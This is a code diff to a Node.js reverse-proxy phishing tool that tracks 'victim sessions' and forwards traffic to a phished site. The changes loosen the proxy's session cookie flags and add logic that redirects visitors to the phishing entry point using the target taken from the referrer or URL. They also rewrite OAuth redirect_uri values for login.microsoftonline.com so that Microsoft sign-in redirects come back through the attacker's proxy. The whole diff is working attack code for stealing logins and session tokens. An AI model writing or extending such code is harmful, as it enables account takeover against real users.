@@ -104,7 +104,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax`;
                 clientResponse.setHeader("Set-Cookie", cookieHeader);
                 console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                 session = cookieName;
@@ -127,6 +127,40 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
         }
+    }
+
+    else if (!currentSession && 
+         url !== PROXY_ENTRY_POINT && 
+         url !== PROXY_PATHNAMES.serviceWorker && 
+         url !== PROXY_PATHNAMES.favicon && 
+         url !== PROXY_PATHNAMES.script && 
+         url !== PROXY_PATHNAMES.jsCookie && 
+         url !== PROXY_PATHNAMES.mutation) {
+    // No session and not a known path – try to extract the target from referrer or current URL
+    let target = '';
+    try {
+        const referer = headers.referer || '';
+        if (referer) {
+            const refUrl = new URL(referer);
+            target = refUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
+        }
+    } catch (e) {}
+    if (!target) {
+        try {
+            const currentUrl = new URL(url, `http://${headers.host}`);
+            target = currentUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
+        } catch (e) {}
+    }
+    if (target) {
+        const entryWithTarget = `${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(target)}`;
+        clientResponse.writeHead(302, { Location: entryWithTarget });
+        clientResponse.end();
+        return;
+    } else {
+        clientResponse.writeHead(302, { Location: REDIRECT_URL });
+        clientResponse.end();
+        return;
+    }
     }
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
@@ -408,7 +442,13 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
             // Rewrite Location to point back to your proxy domain
-            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+            let rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+            // Rewrite redirect_uri parameter if present
+            rewritten = rewritten.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
+                              `redirect_uri=https%3A%2F%2F${proxyHostname}`);
+            rewritten = rewritten.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
+                              `redirect_uri=https://${proxyHostname}`);
+            
             proxyResponse.headers.location = rewritten;
             console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
         } catch (error) {
